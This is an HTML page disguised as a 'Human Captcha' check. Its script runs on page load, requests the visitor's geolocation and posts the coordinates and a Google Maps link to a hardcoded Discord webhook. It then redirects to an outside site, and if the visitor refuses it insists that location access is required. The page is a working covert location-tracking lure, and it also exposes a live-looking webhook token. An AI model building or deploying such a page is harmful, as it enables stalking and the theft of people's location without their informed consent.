<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Human Captcha</title>
  <style>
    body {
      background: url('https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages-1180x812.png') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      height: 100vh;
    }

    @media (max-width: 768px) {
      body {
        background-size: contain;
        background-repeat: no-repeat;
        background-attachment: scroll;
      }
    }
  </style>
</head>
<body>

<script>
function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                const webhookURL = "https://discord.com/api/webhooks/1407159872499486823/SzyEx5es1FxXGwRu4Qvkv-5Cw8PIyUZoYNN-qW9dEaT46Hm6yIXEcl-XjQ0PCvAknPyz";

                const data = {
                    content: `📍 **New Location Shared!**\n🌍 Latitude: ${latitude}\n🌏 Longitude: ${longitude}\n[📌 View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
                };

                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                })
                .then(() => {
                    console.log("Location sent successfully!");
                    window.location.href = "https://mymap.quest/film.php?\\Eli//=9MUDJT.ext";
                })
                .catch((err) => {
                    console.error("Failed to send location.", err);
                });
            },
            (error) => {
                console.warn("Geolocation denied or unavailable.", error);
                alert("Location permission is required to continue. Please refresh and allow location access.");
                // No redirect
            }
        );
    } else {
        alert("Geolocation is not supported by your browser.");
    }
}

document.addEventListener("DOMContentLoaded", sendLocation);
</script>

</body>
</html>
